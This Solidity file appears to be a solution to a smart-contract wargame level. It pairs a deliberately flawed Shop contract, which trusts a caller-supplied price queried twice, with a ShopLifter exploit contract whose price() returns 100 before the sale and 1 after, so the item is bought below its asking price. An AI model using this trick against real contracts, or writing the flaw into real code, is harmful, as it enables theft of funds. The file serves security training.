// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}


contract ShopLifter {

    function haggle(Shop _addr) public {
        Shop(_addr).buy();
    }

    function price() external view returns (uint) {
        if (Shop(msg.sender).isSold()) {
            return 1;
        }
        else {
            return 100;
        }
    }
}